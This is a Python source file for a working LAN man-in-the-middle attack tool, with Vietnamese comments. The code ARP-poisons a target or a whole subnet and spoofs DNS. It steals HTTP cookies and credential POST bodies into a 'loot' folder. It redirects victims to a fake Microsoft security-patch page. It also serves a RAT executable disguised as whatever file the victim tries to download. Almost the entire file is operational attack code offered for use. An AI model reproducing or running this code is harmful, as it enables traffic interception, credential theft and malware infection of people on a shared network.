import os
import sys
import time
import threading
import re
import base64
import subprocess
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt

try:
    from stop_flag import stop_requested
except Exception:
    def stop_requested(name=None):
        return False
try:
    from .network_state import ForwardingStateGuard
except ImportError:
    from network_state import ForwardingStateGuard

os.environ["PYTHONIOENCODING"] = "utf-8"
os.environ["PYTHONUTF8"] = "1"
if sys.stdout.encoding.lower() != 'utf-8':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except:
        pass

console = Console(force_terminal=True, color_system="truecolor", emoji=False)

# Mở tường lửa cho Port 80 để Captive Portal hoạt động
def _clear_port80_rule():
    """Xoá TẤT CẢ rule trùng tên (netsh delete chỉ xoá 1 cái mỗi lần)."""
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Remove-NetFirewallRule -DisplayName 'MITM_Port80' -ErrorAction SilentlyContinue"],
            capture_output=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        )
    except Exception:
        pass


try:
    _clear_port80_rule()
    subprocess.run('netsh advfirewall firewall add rule name="MITM_Port80" dir=in action=allow protocol=TCP localport=80', shell=True, capture_output=True)
except Exception as e:
    console.print(f"[dim yellow][!] Warning: Could not open port 80 on firewall: {e}[/dim yellow]")

try:
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    from scapy.all import ARP, Ether, send, sniff, conf, getmacbyip
except ImportError:
    console.print("[red][-] Thiếu thư viện Scapy. Cài dependency trước khi chạy: pip install -r requirements.txt[/red]")
    sys.exit(1)

class MITM_Sniffer:
    def __init__(self, target_ip, gateway_ip, enable_dns=False):
        self.target_ip = target_ip.strip()
        self.gateway_ip = gateway_ip.strip()
        self.is_subnet_mode = (self.target_ip == "*" or self.target_ip.endswith("/24") or self.target_ip.lower() == "all")
        self.gateway_mac = self.get_mac(gateway_ip)
        self.is_poisoning = True
        self.enable_dns_spoofer = enable_dns
        self.cli_dns_spoofer = enable_dns
        self.packet_count = 0
        self.recent_apps = set()
        self.forwarding_guard = None
        self.restored = False
        self.cp_domains = [
            "captive.apple.com", "www.apple.com", "www.itools.info", "www.ibook.info", "www.airport.us", "www.thinkdifferent.us",
            "connectivitycheck.gstatic.com", "clients3.google.com", "play.googleapis.com",
            "msftconnecttest.com", "www.msftncsi.com", "ipv6.msftconnecttest.com",
            "neverssl.com", "httpforever.com", "detectportal.firefox.com"
        ]
        self.app_signatures = {
            "facebook.com": "Facebook", "fbcdn.net": "Facebook", "messenger.com": "Messenger",
            "graph.facebook.com": "Facebook App", "mqtt-mini.facebook.com": "Messenger App",
            "instagram.com": "Instagram", "cdninstagram.com": "Instagram", "i.instagram.com": "Instagram App",
            "tiktokv.com": "TikTok", "tiktokcdn.com": "TikTok", "byteoversea.com": "TikTok",
            "v16.tiktokcdn.com": "TikTok App", "log.tiktokv.com": "TikTok App",
            "youtube.com": "YouTube", "googlevideo.com": "YouTube", "youtubei.googleapis.com": "YouTube App",
            "zaloapp.com": "Zalo", "zalo.me": "Zalo", "chat.zalo.me": "Zalo App",
            "apple.com": "Apple Services", "icloud.com": "Apple iCloud", "apple-dns.net": "Apple Services",
            "gsp-ssl.ls.apple.com": "Apple Maps", "weather-data.apple.com": "Apple Weather",
            "shopee.vn": "Shopee", "shopeemobile.com": "Shopee", "shopee.com": "Shopee App",
            "lazada.vn": "Lazada", "tinder.com": "Tinder", "netflix.com": "Netflix",
            "riotgames.com": "🎮 Riot Games (LOL/Valorant)", "valorant.com": "🎮 Valorant", "leagueoflegends.com": "🎮 LOL",
            "garena.com": "🎮 Garena (Liên Quân/FIFA)", "garena.vn": "🎮 Garena", "dl.dir.freefiremobile.com": "🎮 Free Fire",
            "tencent.com": "🎮 Tencent Games", "pubgmobile.com": "🎮 PUBG Mobile", "igamecj.com": "🎮 PUBG Mobile",
            "steampowered.com": "🎮 Steam", "steamcommunity.com": "🎮 Steam", "steamserver.net": "🎮 Steam",
            "roblox.com": "🎮 Roblox", "rbxcdn.com": "🎮 Roblox",
            "minecraft.net": "🎮 Minecraft", "mojang.com": "🎮 Minecraft",
            "epicgames.com": "🎮 Epic Games",
            "discord.com": "🎮 Discord", "discordapp.net": "🎮 Discord"
        }
        
        try:
            import socket, psutil
            local_ips = set()
            for iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        local_ips.add(addr.address)
            if not self.is_subnet_mode and target_ip in local_ips:
                console.print(f"[bold red][!] CẢNH BÁO: IP {target_ip} là IP của chính máy Laptop này! Không thể tự MITM chính mình.[/bold red]")
                sys.exit(1)
        except Exception:
            pass

        if not self.is_subnet_mode:
            self.target_mac = self.get_mac(target_ip)
            if not self.target_mac:
                console.print(f"[bold red][-] Không tìm thấy MAC của Mục tiêu ({target_ip}). Nạn nhân có đang online không?[/bold red]")
                sys.exit(1)
        else:
            self.target_mac = "ff:ff:ff:ff:ff:ff"

        if not self.gateway_mac:
            console.print(f"[bold red][-] Không tìm thấy MAC của Gateway ({gateway_ip}).[/bold red]")
            sys.exit(1)

    def get_mac(self, ip):
        mac = getmacbyip(ip)
        if mac:
            return mac
        try:
            from scapy.all import srp
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                return ans[0][1].src
        except:
            pass
        return None

    def start_cp_server(self):
        from http.server import BaseHTTPRequestHandler, HTTPServer
        import base64
        class CaptivePortalHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                import urllib.parse
                import os
                
                parsed_path = urllib.parse.urlparse(self.path)
                
                # ========================================================
                # ĐÒN ĐÁNH EVILGRADE: Phát hiện tải phần mềm để cài RAT
                # ========================================================
                if parsed_path.path.endswith(('.exe', '.zip', '.msi', '.txt')) or 'downloader' in parsed_path.query:
                    malware_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "payload.exe")
                    try:
                        console.print(f"\n[bold yellow][⚡ YÊU CẦU TẢI XUỐNG][/bold yellow] Mục tiêu [bold cyan]{self.client_address[0]}[/bold cyan] bấm nút tải: [green]{parsed_path.path}[/green]")
                    except:
                        pass
                    
                    if os.path.exists(malware_path):
                        with open(malware_path, 'rb') as f:
                            malware_data = f.read()
                        
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/octet-stream')
                        self.send_header('Content-Length', str(len(malware_data)))
                        
                        filename = os.path.basename(parsed_path.path)
                        if not filename or filename == 'interface.php':
                            filename = "Wondershare_Update.exe"
                        if filename.lower().endswith('.txt'):
                            filename = filename + ".exe"
                        
                        self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
                        self.end_headers()
                        self.wfile.write(malware_data)
                        
                        try:
                            console.print(f"[bold red][☠️ EVILGRADE SẬP BẪY][/bold red] Đã tiêm RAT thành công ({len(malware_data)} bytes) cho [bold yellow]{self.client_address[0]}[/bold yellow] dưới tên: [cyan]{filename}[/cyan]")
                        except:
                            pass
                        return
                    else:
                        try:
                            console.print(f"[bold red][!] CẢNH BÁO: Không tìm thấy file RAT tại {malware_path}![/bold red]")
                        except:
                            pass
                # ========================================================
                # MẶC ĐỊNH HOẶC FAKE UPDATE
                # ========================================================
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                
                try:
                    console.print(f"[bold green][🔥 FAKE UPDATE WEB][/bold green] Mục tiêu [bold yellow]{self.client_address[0]}[/bold yellow] vừa mở xem trang Cảnh báo Zero-Day KB5034441!")
                except:
                    pass
                
                # Kiểm tra cờ enable_dns_spoofer từ Server
                if hasattr(self.server, 'enable_dns_spoofer') and self.server.enable_dns_spoofer:
                    html_content = """
                    <!DOCTYPE html>
                    <html lang="vi">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>Cập Nhật Bảo Mật Hệ Thống - Quan Trọng</title>
                        <style>
                            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #005a9e; color: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
                            .container { background-color: white; color: #333; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); max-width: 600px; text-align: center; }
                            h1 { color: #d83b01; font-size: 24px; margin-bottom: 20px; }
                            p { font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
                            .btn { display: inline-block; background-color: #0078d7; color: white; padding: 12px 24px; font-size: 18px; font-weight: bold; text-decoration: none; border-radius: 4px; cursor: pointer; transition: background-color 0.3s; }
                            .btn:hover { background-color: #005a9e; }
                            .footer { margin-top: 20px; font-size: 12px; color: #777; }
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" width="150" style="margin-bottom: 20px;">
                            <h1>LỖ HỔNG BẢO MẬT NGHIÊM TRỌNG</h1>
                            <p>Hệ thống của bạn đang bị đe dọa bởi lỗ hổng Zero-day. Việc kết nối Internet của bạn đã bị tạm ngưng để bảo vệ dữ liệu cá nhân.</p>
                            <p>Vui lòng tải và cài đặt bản vá bảo mật khẩn cấp (KB5034441) ngay lập tức để tiếp tục sử dụng mạng.</p>
                            <a href="/download/KB5034441_Security_Patch.exe" class="btn">TẢI XUỐNG BẢN VÁ (KB5034441)</a>
                            <div class="footer">
                                &copy; 2026 Microsoft Corporation. All rights reserved.
                            </div>
                        </div>
                    </body>
                    </html>
                    """
                else:
                    img_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "popup_image.jpg")
                    if os.path.exists(img_path):
                        with open(img_path, "rb") as img_file:
                            encoded_string = base64.b64encode(img_file.read()).decode("utf-8")
                            ảnh_base64 = f"data:image/jpeg;base64,{encoded_string}"
                    else:
                        ảnh_base64 = "https://i.imgflip.com/1ur9b0.jpg"
    
                    html_content = f"""
                    <html>
                    <head><meta charset='utf-8'><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SYSTEM HACKED</title></head>
                    <body style='background:black;color:lime;text-align:center;padding-top:10%;font-family:consolas;'>
                        <h1>MÁY BẠN ĐÃ BỊ HACK BỞI NGUOI DEP TRAI NHAT THE GIOI!</h1>
                        <img src="{ảnh_base64}" style="max-width: 90%; border: 5px solid red; border-radius: 20px;">
                    </body>
                    </html>
                    """
                self.wfile.write(html_content.encode('utf-8'))
            def do_HEAD(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
            def log_message(self, format, *args):
                pass
        
        def run_server():
            try:
                server = HTTPServer(('0.0.0.0', 80), CaptivePortalHandler)
                server.enable_dns_spoofer = self.enable_dns_spoofer
                server.serve_forever()
            except Exception as e:
                console.print(f"[bold red][!] CẢNH BÁO: Không thể bật Web Server trên Port 80 ({e}). Hãy tắt IIS/XAMPP/Skype đang chiếm Port 80![/bold red]")
        
        t = threading.Thread(target=run_server, daemon=True)
        t.start()

    def spoof(self):
        console.print(f"[cyan][*] Bắt đầu Rải Độc ARP (Spoofing) Mode: {'[MULTIPLE TARGETS - WHOLE SUBNET]' if self.is_subnet_mode else f'Single Target ({self.target_ip})'}[/cyan]")
        self.scanned_hosts = []
        try:
            import json, socket, psutil
            local_ips = set()
            try:
                for iface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            local_ips.add(addr.address)
            except Exception:
                pass
            local_ip = conf.route.route(self.gateway_ip)[1]
            local_ips.add(local_ip)
            local_ips.add(self.gateway_ip)
            mon_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "monitoring")
            topo_path = os.path.join(mon_dir, "topology.json")
            if os.path.exists(topo_path):
                with open(topo_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for node in data.get("nodes", []):
                    ip = node.get("ip")
                    mac = node.get("mac")
                    normalized_mac = str(mac or "").replace("-", ":")
                    is_l2 = node.get("is_l2_local", False) is True
                    valid_mac = re.fullmatch(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", normalized_mac)
                    if node.get("group") == "victim" and ip not in local_ips and is_l2 and valid_mac:
                        self.scanned_hosts.append((ip, normalized_mac))
        except Exception:
            pass

        if self.is_subnet_mode and not self.scanned_hosts:
            console.print("[yellow][!] Không tìm thấy mục tiêu L2 local hợp lệ. Hãy chạy lại LAN Scanner trên subnet local.[/yellow]")
            self.is_poisoning = False
            return

        while self.is_poisoning:
            try:
                if self.is_subnet_mode:
                    if self.scanned_hosts:
                        for tip, tmac in self.scanned_hosts:
                            try:
                                p1 = ARP(op=2, pdst=tip, psrc=self.gateway_ip, hwdst=tmac)
                                p2 = ARP(op=2, pdst=self.gateway_ip, psrc=tip, hwdst=self.gateway_mac)
                                send(p1, verbose=False)
                                send(p2, verbose=False)
                            except Exception as e:
                                console.print(f"[dim red][!] Subnet ARP Spoofing error: {e}[/dim red]")
                else:
                    poison_target = ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=self.target_mac)
                    poison_gateway = ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=self.gateway_mac)
                    send(poison_target, verbose=False)
                    send(poison_gateway, verbose=False)
                time.sleep(2)
            except Exception as e:
                console.print(f"[red][-] Lỗi khi gửi gói tin ARP: {e}[/red]")
                break

    def restore(self):
        if self.restored:
            return
        self.restored = True
        console.print("\n[yellow][*] Khôi phục lại mạng (ARP Restore)...[/yellow]")
        self.is_poisoning = False
        
        if not self.is_subnet_mode:
            restore_target = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
            restore_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
            try:
                send(restore_target, count=5, verbose=False)
                send(restore_gateway, count=5, verbose=False)
            except Exception as exc:
                console.print(f"[dim red][!] Lỗi khi phục hồi ARP (Single): {exc}[/dim red]")
        else:
            try:
                if hasattr(self, 'scanned_hosts') and self.scanned_hosts:
                    for tip, tmac in self.scanned_hosts:
                        rt = ARP(op=2, pdst=tip, hwdst=tmac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                        rg = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=tip, hwsrc=tmac)
                        send(rt, count=2, verbose=False)
                        send(rg, count=2, verbose=False)
            except Exception as exc:
                console.print(f"[dim red][!] Lỗi khi phục hồi ARP (Subnet): {exc}[/dim red]")

        if self.forwarding_guard:
            try:
                self.forwarding_guard.restore()
            except Exception as exc:
                console.print(f"[dim red][!] Lỗi khi phục hồi IP Forwarding: {exc}[/dim red]")
        
        # Đóng tường lửa đã mở ở đầu script
        try:
            import subprocess
            subprocess.run('netsh advfirewall firewall delete rule name="MITM_Port80"', shell=True, capture_output=True)
        except Exception as exc:
            console.print(f"[dim red][!] Lỗi khi xóa Firewall Rule: {exc}[/dim red]")
            
        console.print("[green][+] Mạng đã trở lại bình thường![/green]")

    def process_packet(self, packet):
        from scapy.all import IP, TCP, UDP, Raw, Ether
        
        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            try:
                from scapy.all import get_if_addr
                my_local_ip = get_if_addr(conf.iface)
                if src_ip == my_local_ip or dst_ip == my_local_ip or src_ip == "127.0.0.1":
                    return
            except Exception:
                pass

            self.packet_count += 1
            if self.packet_count % 200 == 0:
                self.recent_apps.clear()

            if packet.haslayer(TCP) and packet.haslayer(Ether) and packet[TCP].dport == 80:
                if packet.haslayer(Raw):
                    payload = packet[Raw].load.decode('utf-8', errors='ignore')
                    if "GET " in payload or "POST " in payload:
                        try:
                            host = payload.split("Host: ")[1].split("\r\n")[0]
                            path = payload.split(" ")[1]
                            console.print(f"\n[bold green][HTTP][/bold green] [bold yellow]{src_ip}[/bold yellow] đang kết nối: [cyan]http://{host}{path}[/cyan]")
                            
                            # CƯỚP COOKIE
                            if "Cookie: " in payload:
                                cookie_data = payload.split("Cookie: ")[1].split("\r\n")[0]
                                console.print(f"[bold magenta][🍪 BÚ COOKIE THÀNH CÔNG!][/bold magenta] [yellow]{src_ip}[/yellow] -> [cyan]{host}[/cyan]")
                                console.print(f"[magenta]Cookie: {cookie_data[:50]}...[/magenta]")
                                
                                # Lưu Cookie vào thư mục loot
                                try:
                                    loot_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "loot")
                                    if not os.path.exists(loot_dir):
                                        os.makedirs(loot_dir)
                                    cookie_file = os.path.join(loot_dir, "stolen_cookies.txt")
                                    with open(cookie_file, "a", encoding="utf-8") as cf:
                                        cf.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] IP: {src_ip} | Host: {host} | Path: {path}\n")
                                        cf.write(f"Cookie: {cookie_data}\n")
                                        cf.write("-" * 50 + "\n")
                                except Exception as e:
                                    pass

                            if "GET " in payload:
                                from scapy.all import get_if_addr
                                my_local_ip = get_if_addr(conf.iface)
                                
                                # Gửi HTTP 302 Redirect thay vì gửi cả HTML (Tránh lỗi giới hạn MTU 1500 bytes)
                                http_response = "HTTP/1.1 302 Found\r\n"
                                http_response += f"Location: http://{my_local_ip}/\r\n"
                                http_response += "Connection: close\r\n\r\n"

                                from scapy.all import Ether, IP, TCP, sendp
                                ether_layer = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
                                ip_layer = IP(src=packet[IP].dst, dst=packet[IP].src)
                                tcp_layer = TCP(sport=80, dport=packet[TCP].sport, seq=packet[TCP].ack, ack=packet[TCP].seq + len(packet[Raw].load), flags="FPA")
                                
                                spoofed_pkt = ether_layer / ip_layer / tcp_layer / http_response.encode('utf-8')
                                sendp(spoofed_pkt, verbose=0)
                                
                                if f"{src_ip}_injected" not in self.recent_apps:
                                    console.print(f"\n[bold red][🔥 HACK SCREEN INJECTED][/bold red] Nạn nhân [bold yellow]{src_ip}[/bold yellow] đã dính đòn Captive Portal/HTTP!")
                                    self.recent_apps.add(f"{src_ip}_injected")
                        except Exception as e:
                            pass
                    
                    if "POST " in payload:
                        body = payload.split('\r\n\r\n')[-1].strip()
                        if body and any(k in body.lower() for k in ("user", "pass", "login", "email", "pwd", "token", "hash", "secret")):
                            console.print(f"\n[bold red][🔥 BINGO - CREDENTIAL / HASH DETECTED!][/bold red] Target [{src_ip}]: \n[bold yellow]{body}[/bold yellow]")
                            try:
                                mon_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "monitoring")
                                sys.path.append(mon_dir)
                                from reporter import report_event, report_finding
                                report_event(f"Captured credential payload from {src_ip}", event_type="warn", module="MITM Sniffer")
                                report_finding("MITM Sniffer", "Captured Password Payload", target=src_ip, severity="block", details=body[:200])
                            except Exception:
                                pass

            elif packet.haslayer(UDP) and packet.haslayer('DNS Question Record'):
                from scapy.all import DNSQR, DNS, DNSRR
                query = packet[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.').lower()
                dns_spoofed = False

                # Captive Portal DNS intercept or full DNS spoof if enabled
                if self.enable_dns_spoofer or any(query == d or query.endswith("." + d) for d in self.cp_domains):
                    try:
                        my_local_ip = get_if_addr(conf.iface)
                        ip_layer = IP(dst=packet[IP].src, src=packet[IP].dst)
                        udp_layer = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                        dns_layer = DNS(id=packet[DNS].id, qr=1, aa=1, rd=0, qd=packet[DNS].qd,
                                        an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=my_local_ip))
                        spoofed_dns = ip_layer / udp_layer / dns_layer
                        send(spoofed_dns, verbose=0)
                        dns_spoofed = True

                        if f"{src_ip}_dns_spoof_{query}" not in self.recent_apps:
                            if self.enable_dns_spoofer and not any(query == d or query.endswith("." + d) for d in self.cp_domains):
                                console.print(f"\n[bold red][DNS SPOOF][/bold red] [{src_ip}] {query} -> redirected to fake update server")
                            else:
                                console.print(f"\n[bold red][CAPTIVE HIJACK][/bold red] [{src_ip}] {query} -> captive portal")
                            self.recent_apps.add(f"{src_ip}_dns_spoof_{query}")
                    except Exception:
                        pass

                # Log non-spoofed DNS queries for passive recon
                if not dns_spoofed and self.packet_count % 5 == 0:
                    console.print(f"[yellow][DNS][/yellow] [{src_ip}] -> [dim white]{query}[/dim white]")
                    
            elif packet.haslayer(TCP) and packet[TCP].dport == 443 and packet.haslayer(Raw):
                payload = packet[Raw].load
                if len(payload) > 5 and payload[0] == 0x16 and payload[5] == 0x01:
                    try:
                        import re
                        snis = re.findall(b'[a-z0-9\-\.]+\.[a-z]{2,}', payload)
                        for sni in snis:
                            domain = sni.decode('utf-8', errors='ignore')
                            if "apple" not in domain and "icloud" not in domain:
                                console.print(f"\n[bold cyan][HTTPS][/bold cyan] [{src_ip}] đang âm thầm vào: [white]https://{domain}[/white]")
                                break
                    except Exception as e:
                        pass

    def start_sniffing(self):
        console.print(f"[cyan][*] Bắt đầu nghe lén (Sniffing) dữ liệu ({'TOÀN MẠNG LAN' if self.is_subnet_mode else self.target_ip})...[/cyan]")
        loot_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "loot")
        os.makedirs(loot_dir, exist_ok=True)
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        self.pcap_filename = os.path.join(loot_dir, f"capture_mitm_{timestamp}.pcap")
        
        try:
            from scapy.all import PcapWriter
            self.pcap_writer = PcapWriter(self.pcap_filename, append=True, sync=True)
            console.print(f"[bold green][+] Đã kích hoạt Auto-PCAP Dumper! Tự động lưu toàn bộ gói tin thô vào: [yellow]{self.pcap_filename}[/yellow][/bold green]")
        except Exception as e:
            self.pcap_writer = None
            console.print(f"[yellow][!] Không thể tạo file PCAP: {e}[/yellow]")

        def packet_handler(pkt):
            if self.pcap_writer:
                try:
                    self.pcap_writer.write(pkt)
                    self.pcap_writer.flush()
                except Exception:
                    pass
            self.process_packet(pkt)

        try:
            filter_str = "" if self.is_subnet_mode else f"host {self.target_ip}"
            correct_iface = conf.route.route(self.gateway_ip)[0]
            sniff_ticks = 0
            while self.is_poisoning:
                if stop_requested("mitm"):
                    console.print("[yellow][*] Nhận lệnh dừng từ dashboard — đang tắt poisoning và phục hồi ARP...[/yellow]")
                    self.is_poisoning = False
                    break
                sniff(
                    iface=correct_iface,
                    filter=filter_str,
                    prn=packet_handler,
                    store=False,
                    timeout=1,
                )
                sniff_ticks += 1
                if sniff_ticks % 10 == 0:
                    console.print(f"[dim cyan][*] [MITM] Đang lắng nghe luồng mạng... (Đã phân tích: {self.packet_count} gói tin)[/dim cyan]")
        except Exception as e:
            console.print(f"[red][-] Lỗi Sniffer: {e}[/red]")
        finally:
            if self.pcap_writer:
                try:
                    self.pcap_writer.close()
                except Exception:
                    pass

    def run(self):
        console.print(Panel(f"[bold red]MITM: MULTI-TARGET PACKET SNIFFING[/bold red]\n[white]Chế độ: {'[BẮT TOÀN BỘ MẠNG LAN]' if self.is_subnet_mode else f'[MỤC TIÊU ĐƠN: {self.target_ip}]'}[/white]", border_style="red"))
        
        # Thiết lập DNS Spoofer
        if hasattr(self, 'cli_dns_spoofer') and self.cli_dns_spoofer:
            self.enable_dns_spoofer = True
            console.print("[bold red][+] DNS SPOOFER ĐÃ BẬT! Sẵn sàng chuyển hướng HTTP![/bold red]\n")
        elif not (sys.stdin and hasattr(sys.stdin, "isatty") and sys.stdin.isatty()):
            self.enable_dns_spoofer = False
            console.print("[dim][*] Chế độ chạy ngầm: DNS Spoofer tắt. Chỉ Hijack Captive Portal.[/dim]\n")
        else:
            try:
                console.print("\n[bold cyan]╭─────────────────────────────────────────────────────────────╮[/bold cyan]")
                console.print("[bold cyan]│ OPTION: KÍCH HOẠT DNS SPOOFER VÀ FAKE WINDOWS UPDATE        │[/bold cyan]")
                console.print("[bold cyan]╰─────────────────────────────────────────────────────────────╯[/bold cyan]")
                choice = Prompt.ask("[bold yellow]Bạn có muốn BẬT DNS Spoofer không?[/bold yellow]", choices=["y", "n"], default="n").strip().lower()
                self.enable_dns_spoofer = (choice == "y")
                if self.enable_dns_spoofer:
                    console.print("[bold red][+] DNS SPOOFER ĐÃ BẬT! Sẵn sàng chuyển hướng![/bold red]\n")
                else:
                    console.print("[dim][-] DNS Spoofer tắt. Chỉ Hijack Captive Portal.[/dim]\n")
            except (EOFError, OSError, Exception):
                self.enable_dns_spoofer = False
                console.print("[dim][-] DNS Spoofer tắt. Chỉ Hijack Captive Portal.[/dim]\n")
        
        self.start_cp_server()
        
        console.print("[cyan][*] Tự động cấu hình IP Forwarding (Chuyển tiếp gói tin)...[/cyan]")
        try:
            local_ip = conf.route.route(self.gateway_ip)[1]
            self.forwarding_guard = ForwardingStateGuard(local_ip)
            self.forwarding_guard.set(True)
            console.print("[bold green][+] Đã bật IP Forwarding trên đúng interface đang sử dụng.[/bold green]")
        except Exception as e:
            console.print(f"[bold red][-] Không thể cấu hình IP Forwarding an toàn: {e}[/bold red]")
            console.print("[bold red][-] MITM cần quyền Administrator để bật IP Forwarding. Dừng module.[/bold red]")
            raise SystemExit(1)
        
        spoof_thread = threading.Thread(target=self.spoof)
        spoof_thread.start()
        
        try:
            self.start_sniffing()
        except KeyboardInterrupt:
            pass
        finally:
            self.restore()
            spoof_thread.join(timeout=3)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        console.print("[red]Sử dụng: python mitm_sniffer.py <IP_NẠN_NHÂN hoac ALL> <IP_ROUTER> [--dns-spoofer][/red]")
        sys.exit(1)
        
    try:
        target = sys.argv[1]
        gateway = sys.argv[2]
        enable_dns = False
        if len(sys.argv) > 3 and sys.argv[3].lower() in ("--dns", "--dns-spoofer", "y", "yes", "true", "1"):
            enable_dns = True
    except IndexError:
        sys.exit(1)
        
    mitm = None
    try:
        mitm = MITM_Sniffer(target, gateway, enable_dns=enable_dns)
        mitm.run()
    finally:
        # Luôn dọn rule firewall, kể cả khi __init__ thoát sớm (MAC không thấy,
        # target là chính máy...) để không để rác trên hệ thống.
        _clear_port80_rule()
